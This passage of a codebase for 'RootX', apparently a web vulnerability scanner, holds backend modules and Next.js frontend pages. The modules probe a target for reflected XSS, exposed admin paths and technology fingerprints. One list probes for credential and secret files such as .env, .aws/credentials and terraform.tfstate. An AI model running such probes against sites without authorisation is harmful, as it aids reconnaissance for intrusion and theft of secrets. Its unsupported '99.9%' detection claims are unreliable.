      const testUrl = target + (target.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
      const resp = await fetch(testUrl, { timeout: 5000 });
      const text = await resp.text();
      if (text.includes(payload)) {
        vulnerabilities.push({ type: 'Reflected XSS', severity: 'critical', riskScore: 85, detail: `Payload reflected in response: ${payload.substring(0, 40)}` });
        break;
      }
    }
  } catch (e) {
    vulnerabilities.push({ type: 'XSS Error', severity: 'info', riskScore: 0, detail: e.message });
  }
  return { module: 'xss', vulnerabilities };
}

module.exports = { checkXSS };
```

## 📁 `backend/modules/sensitive-files.js`

```js
const sensitive = ['.env', '.git/config', 'wp-config.php', 'config.php', 'admin.php', 'backup.sql', 'dump.sql', '.htpasswd', 'phpinfo.php', 'info.php', '.gitignore', 'credentials.json', 'config.json', 'db.json', 'database.yml', '.aws/credentials', '.azure/config', 'composer.json', 'package.json', '.npmrc', '.yarnrc', '.dockerignore', 'Dockerfile', 'docker-compose.yml', 'terraform.tfvars', 'terraform.tfstate'];

async function checkSensitiveFiles(target) {
  const vulnerabilities = [];
  const base = new URL(target);
  for (const f of sensitive) {
    try {
      const testUrl = `${base.protocol}//${base.host}${base.pathname.endsWith('/') ? '' : '/'}${f}`;
      const resp = await fetch(testUrl, { timeout: 3000 });
      if (resp.ok) {
        const size = resp.headers.get('content-length');
        if (!size || parseInt(size) < 500000) {
          vulnerabilities.push({ type: 'Sensitive File Exposed', severity: 'high', riskScore: 75, detail: `Sensitive file accessible: ${f}` });
        }
      }
    } catch { /* skip */ }
  }
  return { module: 'sensitive-files', vulnerabilities };
}

module.exports = { checkSensitiveFiles };
```

## 📁 `backend/modules/admin-panels.js`

```js
const adminPaths = ['/admin', '/administrator', '/admin.php', '/login', '/wp-admin', '/wp-login.php', '/cpanel', '/webadmin', '/panel', '/backend', '/dashboard', '/manager', '/controlpanel', '/phpmyadmin', '/phpMyAdmin', '/pma', '/admin/login', '/user/login', '/signin', '/console', '/management', '/admin/panel', '/admincp', '/adminarea', '/moderator', '/staff', '/root', '/shell', '/cmd', '/exec', '/server-status', '/server-info', '/debug', '/test', '/api', '/graphql', '/swagger', '/docs', '/_dev'];

async function checkAdminPanels(target) {
  const vulnerabilities = [];
  const base = new URL(target);
  for (const p of adminPaths) {
    try {
      const testUrl = `${base.protocol}//${base.host}${p}`;
      const resp = await fetch(testUrl, { timeout: 3000 });
      if (resp.ok && resp.status !== 404) {
        const text = await resp.text();
        const loginIndicators = ['login', 'password', 'username', 'sign in', 'sign-in', 'admin'];
        if (loginIndicators.some(i => text.toLowerCase().includes(i))) {
          vulnerabilities.push({ type: 'Admin Panel Exposed', severity: 'high', riskScore: 70, detail: `Admin panel accessible at: ${p}` });
        }
      }
    } catch { /* skip */ }
  }
  return { module: 'admin-panels', vulnerabilities };
}

module.exports = { checkAdminPanels };
```

## 📁 `backend/modules/tech-detect.js`

```js
const techPatterns = {
  'WordPress': [/wp-content/i, /wp-includes/i, /wp-json/i],
  'Drupal': [/drupal/i, /sites\/default/i, /Drupal/i],
  'Joomla': [/joomla/i, /\/media\/system/i, /com_content/i],
  'Laravel': [/laravel/i, /livewire/i, /_debugbar/i],
  'Django': [/django/i, /csrfmiddlewaretoken/i, /sessionid/i],
  'Ruby on Rails': [/rails/i, /_session_id/i, /authenticity_token/i],
  'ASP.NET': [/__requestverificationtoken/i, /asp.net/i, /viewstate/i, /x-aspnet-version/i],
  'Express': [/express/i, /x-powered-by: Express/i],
  'nginx': [/nginx/i, /server: nginx/i],
  'Apache': [/apache/i, /server: apache/i],
  'Cloudflare': [/cloudflare/i, /__cfduid/i],
  'jQuery': [/jquery/i, /\$\(/i],
  'React': [/react/i, /__nextf/i, /next\.js/i],
  'Vue.js': [/vue/i, /__vue__/i],
  'Google Analytics': [/google-analytics/i, /ga\s*\(/i],
  'Font Awesome': [/font-awesome/i, /fa-/i],
};

async function checkTechDetect(target) {
  const technologies = [];
  try {
    const resp = await fetch(target, { timeout: 10000 });
    const text = await resp.text();
    const headers = resp.headers;
    for (const [tech, patterns] of Object.entries(techPatterns)) {
      for (const p of patterns) {
        if (p.test(text) || p.test(JSON.stringify(Object.fromEntries(headers)))) {
          technologies.push(tech);
          break;
        }
      }
    }
  } catch { /* skip */ }
  return { module: 'tech-detect', technologies };
}

module.exports = { checkTechDetect };
```

## 📁 `frontend/app/page.tsx`

```tsx
"use client";

import { motion } from "framer-motion";
import { useState, useEffect } from "react";
import Link from "next/link";
import { Shield, Zap, Bug, Globe, Lock, Activity, ChevronRight, Terminal, Server, AlertTriangle } from "lucide-react";
import RootXBadge from "@/components/RootXBadge";

const targetDate = new Date("2025-03-20T00:00:00+05:30");

function getTimeLeft() {
  const now = new Date();
  const diff = targetDate.getTime() - now.getTime();
  if (diff <= 0) return null;
  const d = Math.floor(diff / (1000 * 60 * 60 * 24));
  const h = Math.floor((diff / (1000 * 60 * 60)) % 24);
  const m = Math.floor((diff / (1000 * 60)) % 60);
  const s = Math.floor((diff / 1000) % 60);
  return { d, h, m, s };
}

const features = [
  { icon: Shield, title: "AI-Powered Shield", desc: "Real-time attack prevention with machine learning-based threat detection engine.", color: "from-cyan-400 to-blue-600" },
  { icon: Bug, title: "Vulnerability Scanner", desc: "Deep scan for SQLi, XSS, CSRF, LFI, SSRF, and 100+ other vulnerability types.", color: "from-purple-400 to-pink-600" },
  { icon: Zap, title: "Zero-Day Detection", desc: "Heuristic analysis engine capable of identifying novel attack patterns.", color: "from-yellow-400 to-orange-600" },
  { icon: Globe, title: "Full-Spectrum Coverage", desc: "Web, API, mobile backend, cloud infrastructure — all from one platform.", color: "from-green-400 to-teal-600" },
  { icon: Lock, title: "Compliance Ready", desc: "OWASP Top 10, PCI-DSS, HIPAA, GDPR mapping with auto-generated reports.", color: "from-red-400 to-rose-600" },
  { icon: Activity, title: "Live Threat Monitor", desc: "Real-time dashboard with attack visualization and IP blocking controls.", color: "from-blue-400 to-indigo-600" },
];

export default function Home() {
  const [timeLeft, setTimeLeft] = useState(getTimeLeft());
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });

  useEffect(() => {
    const timer = setInterval(() => setTimeLeft(getTimeLeft()), 1000);
    const handleMouse = (e: MouseEvent) => setMousePos({ x: e.clientX, y: e.clientY });
    window.addEventListener("mousemove", handleMouse);
    return () => { clearInterval(timer); window.removeEventListener("mousemove", handleMouse); };
  }, []);

  return (
    <div className="relative min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-black text-white overflow-hidden">
      <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:60px_60px] pointer-events-none" />
      <div className="absolute top-0 left-0 w-full h-full pointer-events-none" style={{ background: `radial-gradient(600px at ${mousePos.x}px ${mousePos.y}px, rgba(6,182,212,0.15), transparent 80%)` }} />

      <nav className="relative z-20 flex items-center justify-between px-8 py-5 border-b border-white/5 backdrop-blur-xl bg-black/20">
        <div className="flex items-center gap-3">
          <Shield className="w-7 h-7 text-cyan-400" />
          <span className="text-xl font-bold bg-gradient-to-r from-cyan-400 to-blue-600 bg-clip-text text-transparent">RootX</span>
        </div>
        <div className="flex items-center gap-6">
          <span className="text-sm text-gray-400">v3.0.0</span>
          <Link href="/dashboard" className="px-5 py-2 text-sm font-medium text-white bg-gradient-to-r from-cyan-500 to-blue-600 rounded-lg hover:from-cyan-400 hover:to-blue-500 transition-all shadow-lg shadow-cyan-500/25">Dashboard</Link>
          <Link href="/chat" className="px-5 py-2 text-sm font-medium text-gray-300 border border-white/10 rounded-lg hover:border-cyan-400/50 hover:text-cyan-300 transition-all">AI Chat</Link>
        </div>
      </nav>

      <main className="relative z-10 max-w-6xl mx-auto px-6 pt-24 pb-32">
        <motion.div initial={{ opacity: 0, y: 40 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.8 }} className="text-center mb-28">
          <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ duration: 0.6, type: "spring" }} className="inline-flex items-center gap-2 px-4 py-1.5 mb-6 text-xs font-medium text-cyan-300 bg-cyan-500/10 border border-cyan-500/20 rounded-full">
            <Terminal className="w-3.5 h-3.5" /> Next-Gen Security Platform
          </motion.div>
          <h1 className="text-6xl md:text-8xl font-bold mb-6 tracking-tight">
            <span className="bg-gradient-to-r from-cyan-200 via-blue-300 to-purple-400 bg-clip-text text-transparent">RootX</span><br />
            <span className="text-4xl md:text-5xl text-gray-400 font-light">Hack-Proof Your Stack</span>
          </h1>
          <p className="text-lg text-gray-400 max-w-2xl mx-auto mb-10 leading-relaxed">
            AI-driven web application security platform combining real-time attack prevention, deep vulnerability scanning, and intelligent threat analysis.
          </p>
          <div className="flex items-center justify-center gap-4 flex-wrap">
            <Link href="/dashboard" className="group px-8 py-3.5 text-base font-semibold text-white bg-gradient-to-r from-cyan-500 to-blue-600 rounded-xl hover:from-cyan-400 hover:to-blue-500 transition-all shadow-xl shadow-cyan-500/30 flex items-center gap-2">
              Launch Scanner <ChevronRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
            </Link>
            <Link href="/protected" className="group px-8 py-3.5 text-base font-medium text-gray-300 border border-white/10 rounded-xl hover:border-cyan-400/50 hover:text-cyan-300 transition-all flex items-center gap-2">
              <Shield className="w-4 h-4" /> Test Shield
            </Link>
          </div>
        </motion.div>

        <motion.div initial={{ opacity: 0, y: 60 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.8, delay: 0.3 }} className="grid md:grid-cols-2 lg:grid-cols-3 gap-6 mb-28">
          {features.map((f, i) => (
            <motion.div key={i} initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5, delay: 0.1 * i }} className="group relative p-6 bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl hover:bg-white/[0.07] transition-all">
              <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${f.color} p-2.5 mb-4 group-hover:scale-110 transition-transform`}>
                <f.icon className="w-full h-full text-white" />
              </div>
              <h3 className="text-lg font-semibold text-white mb-2">{f.title}</h3>
              <p className="text-sm text-gray-400 leading-relaxed">{f.desc}</p>
            </motion.div>
          ))}
        </motion.div>

        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 1, delay: 0.6 }} className="flex items-center justify-center gap-12 flex-wrap p-8 bg-white/[0.03] border border-white/5 rounded-2xl">
          <div className="text-center"><div className="text-3xl font-bold text-cyan-400">99.9%</div><div className="text-xs text-gray-500 mt-1">Threat Detection</div></div>
          <div className="text-center"><div className="text-3xl font-bold text-purple-400">150+</div><div className="text-xs text-gray-500 mt-1">Attack Signatures</div></div>
          <div className="text-center"><div className="text-3xl font-bold text-blue-400">10ms</div><div className="text-xs text-gray-500 mt-1">Avg Response</div></div>
          <div className="text-center"><div className="text-3xl font-bold text-green-400">24/7</div><div className="text-xs text-gray-500 mt-1">AI Monitoring</div></div>
        </motion.div>
      </main>
    </div>
  );
}
```

## 📁 `frontend/app/layout.tsx`

```tsx
import type { Metadata } from "next";
import { Inter, JetBrains_Mono } from "next/font/google";
import "./globals.css";

const inter = Inter({ subsets: ["latin"], variable: "--font-inter" });
const jetbrains = JetBrains_Mono({ subsets: ["latin"], variable: "--font-mono" });

export const metadata: Metadata = {
  title: "RootX — Next-Gen Security Platform",
  description: "AI-powered web application security platform. Real-time attack prevention, deep vulnerability scanning, and intelligent threat analysis.",
};

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en" className="dark">
      <body className={`${inter.variable} ${jetbrains.variable} font-sans bg-black text-white antialiased`}>
        {children}
      </body>
    </html>
  );
}
```

## 📁 `frontend/app/chat/page.tsx`

```tsx
"use client";

import { useState, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Send, Bot, User, Shield, AlertTriangle, Bug, Info, ChevronRight, Terminal, Loader2, RefreshCw, Trash2 } from "lucide-react";
import Sidebar from "@/components/Sidebar";

type Message = {
  id: string;
  role: "user" | "assistant";
  content: string;
  vulns?: any[];
};

type Severity = "critical" | "high" | "medium" | "low" | "info";

const severityConfig: Record<Severity, { color: string; bg: string; icon: any }> = {
  critical: { color: "text-red-400", bg: "bg-red-500/10 border-red-500/30", icon: AlertTriangle },
  high: { color: "text-orange-400", bg: "bg-orange-500/10 border-orange-500/30", icon: Bug },
  medium: { color: "text-yellow-400", bg: "bg-yellow-500/10 border-yellow-500/30", icon: Shield },
  low: { color: "text-blue-400", bg: "bg-blue-500/10 border-blue-500/30", icon: Info },
  info: { color: "text-gray-400", bg: "bg-gray-500/10 border-gray-500/30", icon: Terminal },
};

export default function ChatPage() {
  const [messages, setMessages] = useState<Message[]>([
    { id: "welcome", role: "assistant", content: "Hello! I'm RootX AI. Ask me about security vulnerabilities, scan results, attack patterns, or remediation steps. I can also analyze websites in real-time." },
  ]);
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => { messagesEndRef.current?.scrollIntoView({ behavior: "smooth" }); }, [messages]);

  const handleSend = async () => {
    if (!input.trim() || loading) return;
    const userMsg: Message = { id: Date.now().toString(), role: "user", content: input };
    setMessages(prev => [...prev, userMsg]);
    setInput("");
    setLoading(true);
    try {
      const res = await fetch("/api/chat", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: userMsg.content, history: messages.slice(-6).map(m => ({ role: m.role, content: m.content })) }),
      });
      const data = await res.json();
      setMessages(prev => [...prev, { id: (Date.now()+1).toString(), role: "assistant", content: data.reply || data.error || "No response", vulns: data.vulnerabilities }]);
    } catch {
      setMessages(prev => [...prev, { id: (Date.now()+1).toString(), role: "assistant", content: "Sorry, I encountered an error processing your request." }]);
    } finally { setLoading(false); }
  };

  return (
    <div className="flex h-screen bg-gray-950 text-white">
      <Sidebar isOpen={sidebarOpen} onToggle={() => setSidebarOpen(!sidebarOpen)} />
      <div className="flex-1 flex flex-col">
        <header className="flex items-center justify-between px-6 py-4 border-b border-white/5 bg-black/40 backdrop-blur-xl">
          <div className="flex items-center gap-3">
            <Bot className="w-5 h-5 text-cyan-400" />
            <h1 className="text-lg font-semibold">RootX AI Chat</h1>
          </div>
          <button onClick={() => setMessages([{ id: "welcome", role: "assistant", content: "Chat history cleared. How can I help you with security today?" }])} className="p-2 rounded-lg hover:bg-white/5 transition-colors" title="Clear chat">
            <Trash2 className="w-4 h-4 text-gray-400" />
          </button>
        </header>

        <div className="flex-1 overflow-y-auto px-6 py-4 space-y-3">
          <AnimatePresence>
            {messages.map((msg) => (
              <motion.div key={msg.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className={`flex gap-3 ${msg.role === "user" ? "justify-end" : ""}`}>
                {msg.role === "assistant" && <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center flex-shrink-0"><Bot className="w-4 h-4 text-white" /></div>}
                <div className={`max-w-2xl ${msg.role === "user" ? "bg-blue-600/20 border border-blue-500/30" : "bg-white/5 border border-white/10"} rounded-xl px-4 py-3`}>
                  <p className="text-sm text-gray-200 whitespace-pre-wrap">{msg.content}</p>
                  {msg.vulns && msg.vulns.length > 0 && (
                    <div className="mt-3 space-y-2">
                      {msg.vulns.slice(0, 5).map((v, i) => {
                        const sev = (v.severity || "info").toLowerCase() as Severity;
                        const cfg = severityConfig[sev] || severityConfig.info;
                        const Icon = cfg.icon;
                        return (
                          <div key={i} className={`flex items-start gap-2 p-2 rounded-lg border ${cfg.bg}`}>
                            <Icon className={`w-4 h-4 mt-0.5 ${cfg.color}`} />
                            <div><p className="text-xs font-medium text-gray-200">{v.type || "Unknown"}</p><p className="text-xs text-gray-400">{v.detail || v.description || ""}</p></div>
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>
                {msg.role === "user" && <div className="w-8 h-8 rounded-lg bg-purple-600 flex items-center justify-center flex-shrink-0"><User className="w-4 h-4 text-white" /></div>}
              </motion.div>
            ))}
          </AnimatePresence>
          {loading && <div className="flex items-center gap-2 text-sm text-gray-400"><Loader2 className="w-4 h-4 animate-spin" /> RootX AI is thinking...</div>}
          <div ref={messagesEndRef} />
        </div>

        <div className="px-6 py-4 border-t border-white/5 bg-black/40">
          <div className="flex gap-3">
            <input value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => e.key === "Enter" && !e.shiftKey && (e.preventDefault(), handleSend())} placeholder="Ask about vulnerabilities, scan results, or security best practices..." className="flex-1 px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/20 transition-all" />
            <button onClick={handleSend} disabled={loading || !input.trim()} className="px-5 py-3 bg-gradient-to-r from-cyan-500 to-blue-600 rounded-xl hover:from-cyan-400 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition-all"><Send className="w-4 h-4" /></button>
          </div>
        </div>
      </div>
    </div>
  );
}
```

## 📁 `frontend/app/dashboard/page.tsx`

```tsx
"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Shield, Zap, Bug, Globe, Lock, Activity, ChevronRight, Terminal, Server, AlertTriangle, Search, RefreshCw, XCircle, CheckCircle, Clock, Download, Brain, Gauge, Siren } from "lucide-react";
import Sidebar from "@/components/Sidebar";
import Navbar from "@/components/Navbar";
import SecurityCard from "@/components/SecurityCard";
import { ScatterChart, Scatter, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer } from "recharts";
import { BarChart, Bar, PieChart, Pie, Cell } from "recharts";

const MODULES = ["Baseline", "Shield", "AI Agent", "Headers", "Cookies", "SSL", "SQLi", "XSS", "Sensitive Files", "Admin Panels", "Tech Detect"];
const SEVERITY_COLORS: Record<string, string> = { critical: "#ef4444", high: "#f97316", medium: "#eab308", low: "#3b82f6", info: "#6b7280" };

export default function Dashboard() {
  const [target, setTarget] = useState("");
  const [scanning, setScanning] = useState(false);
  const [scanResult, setScanResult] = useState<any>(null);
  const [error, setError] = useState("");
  const [history, setHistory] = useState<any[]>([]);
  const [liveLog, setLiveLog] = useState<string[]>([]);
  const [activeTab, setActiveTab] = useState<"scan" | "history" | "shield" | "monitor">("scan");
  const [shieldStats, setShieldStats] = useState<any>(null);
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const wsRef = useRef<WebSocket | null>(null);
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => { fetchHistory(); fetchShieldStats(); connectWebSocket(); return () => wsRef.current?.close(); }, []);

  const connectWebSocket = () => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${protocol}//${window.location.host}`);
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === "scan:progress") setLiveLog(prev => [...prev.slice(-99), `[${new Date().toLocaleTimeString()}] ${data.message}`]);
        if (data.type === "shield:attack") setShieldStats((prev: any) => prev ? { ...prev, totalBlocked: (prev.totalBlocked || 0) + 1 } : prev);
      } catch {}
    };
    wsRef.current = ws;
  };

  const fetchHistory = async () => { try { const r = await fetch("/api/stats"); const d = await r.json(); setHistory(Array.isArray(d) ? d : []); } catch {} };
  const fetchShieldStats = async () => { try { const r = await fetch("/api/shield/stats"); if (r.ok) setShieldStats(await r.json()); } catch {} };

  const runScan = useCallback(async () => {
    if (!target.trim() || scanning) return;
    setScanning(true); setError(""); setScanResult(null);
    setLiveLog([`[${new Date().toLocaleTimeString()}] Initiating scan on ${target}...`]);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 60000);
    try {
      const res = await fetch("/api/scan", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ target: target.startsWith("http") ? target : `https://${target}` }), signal: controller.signal });
      if (!res.ok) throw new Error(`Scan failed: ${res.statusText}`);
      const data = await res.json();
      setScanResult(data);
      setLiveLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] Scan complete. Risk score: ${data.riskScore} (${data.severity})`]);
      fetchHistory();
    } catch (err: any) {
      if (err.name === "AbortError") setError("Scan timed out after 60 seconds");
      else setError(err.message);
      setLiveLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] Error: ${err.message}`]);
    } finally { clearTimeout(timeout); setScanning(false); }
  }, [target, scanning]);

  const getTopVulns = () => {
    if (!scanResult?.vulnerabilities) return [];
    const counts: Record<string, { count: number; maxSeverity: string }> = {};
    scanResult.vulnerabilities.forEach((v: any) => {
      const t = v.type || "Unknown";
      if (!counts[t]) counts[t] = { count: 0, maxSeverity: v.severity || "info" };
      counts[t].count++;
      const order = ["info","low","medium","high","critical"];
      if (order.indexOf(v.severity) > order.indexOf(counts[t].maxSeverity)) counts[t].maxSeverity = v.severity;
    });
    return Object.entries(counts).sort((a: any, b: any) => b[1].count - a[1].count).slice(0, 10).map(([type, data]) => ({ type, ...data as any }));
  };

  const downloadReport = () => {
    if (!scanResult) return;
    const blob = new Blob([JSON.stringify(scanResult, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url; a.download = `rootx-scan-${Date.now()}.json`; a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="flex h-screen bg-gray-950 text-white">
      <Sidebar isOpen={sidebarOpen} onToggle={() => setSidebarOpen(!sidebarOpen)} />
      <div className="flex-1 flex flex-col overflow-hidden">
        <Navbar title="Dashboard" />

        <div className="flex items-center gap-1 px-6 pt-4 pb-2 border-b border-white/5">
          {(["scan","history","shield","monitor"] as const).map(tab => (
            <button key={tab} onClick={() => setActiveTab(tab)} className={`px-4 py-2 text-xs font-medium rounded-lg transition-all capitalize ${activeTab === tab ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/30" : "text-gray-400 hover:text-gray-200 hover:bg-white/5"}`}>{tab}</button>
          ))}
        </div>

        <div className="flex-1 overflow-y-auto p-6">
          {activeTab === "scan" && (
            <div className="space-y-6">
              <div className="flex gap-3">
                <input value={target} onChange={e => setTarget(e.target.value)} placeholder="Enter target URL (e.g. https://example.com)" className="flex-1 px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/20 transition-all" onKeyDown={e => e.key === "Enter" && runScan()} />
                <button onClick={runScan} disabled={scanning || !target.trim()} className="px-6 py-3 bg-gradient-to-r from-cyan-500 to-blue-600 rounded-xl hover:from-cyan-400 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center gap-2 text-sm font-medium">
                  {scanning ? <><RefreshCw className="w-4 h-4 animate-spin" /> Scanning</> : <><Search className="w-4 h-4" /> Scan</>}
                </button>
              </div>

              {error && <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-xl text-sm text-red-400">{error}</div>}

              {scanning && (
                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="p-4 bg-white/5 border border-white/10 rounded-xl">
                  <div className="flex items-center gap-2 mb-3"><RefreshCw className="w-4 h-4 animate-spin text-cyan-400" /><span className="text-sm font-medium">Scan in progress...</span></div>
                  <div className="h-1 bg-white/10 rounded-full overflow-hidden"><motion.div className="h-full bg-gradient-to-r from-cyan-500 to-blue-600 rounded-full" animate={{ width: ["0%", "100%"] }} transition={{ duration: 30, ease: "linear" }} /></div>
                </motion.div>
              )}

              {liveLog.length > 0 && scanning && (
                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="p-4 bg-black/60 border border-white/5 rounded-xl font-mono text-xs max-h-40 overflow-y-auto">
                  {liveLog.map((l, i) => <div key={i} className="text-gray-400">{l}</div>)}
                  <div ref={logEndRef} />
                </motion.div>
              )}

              {scanResult && !scanning && (
                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
                  <div className="grid grid-cols-4 gap-4">
                    <SecurityCard title="Risk Score" value={scanResult.riskScore} icon={Gauge} color={scanResult.riskScore >= 70 ? "red" : scanResult.riskScore >= 40 ? "yellow" : "green"} />
                    <SecurityCard title="Severity" value={scanResult.severity?.toUpperCase()} icon={AlertTriangle} color={scanResult.severity === "critical" ? "red" : scanResult.severity === "high" ? "orange" : "yellow"} />
                    <SecurityCard title="Vulnerabilities" value={scanResult.vulnerabilities?.length || 0} icon={Bug} color="purple" />
                    <SecurityCard title="Target" value={scanResult.target} icon={Globe} color="blue" />
                  </div>

                  <div className="grid grid-cols-2 gap-6">
                    <div className="p-4 bg-white/5 border border-white/10 rounded-xl">
                      <h3 className="text-sm font-medium mb-4">Severity Distribution</h3>
                      <ResponsiveContainer width="100%" height={200}>
                        <PieChart>
                          <Pie data={(() => { const s: Record<string,number> = {}; scanResult.vulnerabilities?.forEach((v: any) => { const sev = v.severity || "info"; s[sev] = (s[sev] || 0) + 1; }); return Object.entries(s).map(([severity, count]) => ({ severity, count })); })()} dataKey="count" nameKey="severity" cx="50%" cy="50%" outerRadius={80}>
                            {Object.entries(SEVERITY_COLORS).map(([severity, color]) => (<Cell key={severity} fill={color} />))}
                          </Pie>
                          <Tooltip />
                        </PieChart>
                      </ResponsiveContainer>
                    </div>
                    <div className="p-4 bg-white/5 border border-white/10 rounded-xl">
                      <h3 className="text-sm font-medium mb-4">Top Vulnerabilities</h3>
                      <ResponsiveContainer width="100%" height={200}>
                        <BarChart data={getTopVulns().slice(0, 5)}>
                          <CartesianGrid strokeDasharray="3 3" stroke="#ffffff10" />
                          <XAxis dataKey="type" tick={{ fontSize: 10, fill: "#9ca3af" }} />
                          <YAxis tick={{ fontSize: 10, fill: "#9ca3af" }} />
                          <Tooltip />
                          <Bar dataKey="count" fill="#06b6d4" radius={[4, 4, 0, 0]} />
                        </BarChart>
                      </ResponsiveContainer>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <h3 className="text-sm font-medium">All Vulnerabilities ({scanResult.vulnerabilities?.length || 0})</h3>
                      <button onClick={downloadReport} className="flex items-center gap-1 px-3 py-1.5 text-xs bg-white/5 border border-white/10 rounded-lg hover:bg-white/10 transition-all"><Download className="w-3 h-3" /> Report</button>
                    </div>
                    {scanResult.vulnerabilities?.map((v: any, i: number) => (
                      <motion.div key={i} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.03 }} className="flex items-start gap-3 p-3 bg-white/[0.03] border border-white/5 rounded-lg hover:bg-white/[0.06] transition-all">
                        <div className="w-2 h-2 mt-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: SEVERITY_COLORS[v.severity?.toLowerCase()] || "#6b7280" }} />
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2"><span className="text-sm font-medium text-gray-200">{v.type || "Unknown"}</span><span className={`text-[10px] px-1.5 py-0.5 rounded font-medium uppercase ${v.severity === "critical" ? "text-red-400 bg-red-500/10" : v.severity === "high" ? "text-orange-400 bg-orange-500/10" : v.severity === "medium" ? "text-yellow-400 bg-yellow-500/10" : "text-gray-400 bg-gray-500/10"}`}>{v.severity || "info"}</span></div>
                          <p className="text-xs text-gray-400 mt-0.5 truncate">{v.detail || v.description || ""}</p>
                        </div>
                        <span className="text-xs text-gray-500 flex-shrink-0">Risk: {v.riskScore ?? "?"}</span>
                      </motion.div>
                    ))}
                  </div>
                </motion.div>
              )}
            </div>
          )}

          {activeTab === "history" && (
            <div className="space-y-3">
              <h2 className="text-lg font-semibold mb-4">Scan History</h2>
              {history.length === 0 ? <p className="text-sm text-gray-400">No scans yet. Run your first scan!</p> : history.map((h, i) => (
                <div key={i} className="flex items-center justify-between p-4 bg-white/5 border border-white/10 rounded-xl">
                  <div><p className="text-sm font-medium">{h.target}</p><p className="text-xs text-gray-400">{new Date(h.created_at || h.timestamp).toLocaleString()}</p></div>
                  <div className="flex items-center gap-3"><span className={`text-xs px-2 py-1 rounded font-medium ${h.severity === "critical" ? "bg-red-500/10 text-red-400" : h.severity === "high" ? "bg-orange-500/10 text-orange-400" : "bg-gray-500/10 text-gray-400"}`}>{h.severity}</span><span className="text-sm font-bold">{h.risk_score}</span></div>
                </div>
              ))}
            </div>
          )}

          {activeTab === "shield" && (
            <div className="grid grid-cols-3 gap-4">
              <SecurityCard title="Total Requests" value={shieldStats?.totalRequests || 0} icon={Activity} color="blue" />
              <SecurityCard title="Blocked" value={shieldStats?.totalBlocked || 0} icon={XCircle} color="red" />
              <SecurityCard title="Blocked IPs" value={shieldStats?.blockedIPs || 0} icon={Shield} color="orange" />
              {shieldStats?.recentAttacks?.map((a: any, i: number) => (
                <div key={i} className="col-span-1 p-3 bg-white/5 border border-white/10 rounded-xl text-xs"><p className="text-red-400 font-medium">{a.type}</p><p className="text-gray-400">{a.ip} - {a.severity}</p><p className="text-gray-500">{new Date(a.timestamp).toLocaleTimeString()}</p></div>
              ))}
            </div>
          )}

          {activeTab === "monitor" && shieldStats?.blockedIPList?.length > 0 && (
            <div className="space-y-2">
              <h2 className="text-lg font-semibold mb-4">Blocked IPs</h2>
              {shieldStats.blockedIPList.map((b: any, i: number) => (
                <div key={i} className="flex items-center justify-between p-3 bg-white/5 border border-white/10 rounded-xl">
                  <div><p className="text-sm font-mono text-red-400">{b.ip}</p><p className="text-xs text-gray-400">{b.reason}</p></div>
                  <span className="text-xs text-gray-500">{(b.remainingMs / 1000 / 60).toFixed(0)}m remaining</span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
```

## 📁 `frontend/app/history/page.tsx`

```tsx
"use client";

